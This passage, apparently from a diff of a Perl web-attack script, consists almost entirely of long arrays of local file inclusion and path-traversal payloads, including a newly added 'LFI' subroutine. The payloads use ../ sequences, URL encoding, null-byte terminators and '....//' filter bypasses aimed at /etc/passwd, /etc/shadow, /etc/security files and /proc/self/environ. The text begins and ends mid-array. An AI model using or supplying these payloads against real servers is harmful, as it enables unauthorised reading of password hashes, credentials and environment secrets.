./../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../../../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00");}
-
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+sub LFI {@LFI =("/passwd.txt", "/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","....//etc/passwd","....//....//etc/passwd","....//....//....//etc/passwd","....//....//....//....//etc/passwd","....//....//....//....//....//etc/passwd","....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","....//etc/passwd%00","....//....//etc/passwd%00","....//....//....//etc/passwd%00","....//....//....//....//etc/passwd%00","....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/passwd%00","%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","%2Fetc%2Fpasswd%00","..%2Fetc%2Fpasswd%00","..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","....%2f%2Fetc/passwd","....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00","%2Fproc%2Fself%2Fenviron","..%2Fproc%2Fself%2Fenviron","..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","%2Fproc%2Fself%2Fenviron%00","..%2Fproc%2Fself%2Fenviron%00","..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","//proc/self/environ","....//proc/self/environ","....//....//proc/self/environ","....//....//....//proc/self/environ","....//....//....//....//proc/self/environ","....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//....//proc/self/environ","//proc/self/environ%00","....//proc/self/environ%00","....//....//proc/self/environ%00","....//....//....//proc/self/environ%00","....//....//....//....//proc/self/environ%00","....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//....//proc/self/environ%00","%2f%2Fproc/self/environ","....%2f%2Fproc/self/environ","....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","%2f%2Fproc/self/environ%00","....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F..<!---->..%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%0